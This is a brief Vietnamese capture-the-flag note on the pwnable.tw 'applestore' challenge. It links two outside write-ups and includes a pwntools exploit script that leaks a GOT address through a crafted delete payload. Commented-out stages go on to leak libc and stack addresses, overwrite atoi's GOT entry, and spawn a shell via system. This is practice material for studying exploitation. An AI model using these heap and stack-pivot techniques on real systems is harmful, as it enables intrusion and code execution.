# applestore 
- 1 chall khó kết hợp giữa stack pivoting và bof
- vì ko debug được trên mình ko viết wu được, nên mình gửi wu mình tìm được tại đây
# writeup 
- https://drx.home.blog/2019/04/16/pwnable-tw-applestore/
- https://hackmd.io/@trhoanglan04/ryoncvv42#applestore-200-pts
# script 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = process([exe.path])
# p = remote('chall.pwnable.tw', 10104)

gdb.attach(p, gdbscript='''
# b*create+79
# b*insert+52
b*delete+71
b*delete+101
b*0x08048b6b
c
''')
input()
    
def add(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx))

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', idx)

def checkout():
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'> ', b'y')


for i in range(20):
        add(2)

for i in range(6):
        add(1)

checkout()

payload = b'27' + p32(exe.got['puts'])
delete(payload)

# p.recvuntil(b'27:')
# libc_leak = u32(p.recv(4))
# libc.address = libc_leak - libc.sym['puts']
# info("libc leak: " + hex(libc_leak))
# info("libc base: " + hex(libc.address))

# payload = b'27' + p32(libc.sym['__environ'])
# delete(payload)

# p.recvuntil(b'27:')
# stack_leak = u32(p.recv(4))
# need = stack_leak - 0x104 - 0x8
# info("stack leak: " + hex(stack_leak))
# info("stack need: " + hex(need))


# payload = b'27' + p32(0)*2 + p32(exe.got['atoi']+0x22) + p32(need)
# delete(payload)

# payload = p32(libc.sym['system']) + b'||sh'
# p.sendlineafter(b'> ', payload)

p.interactive()
```
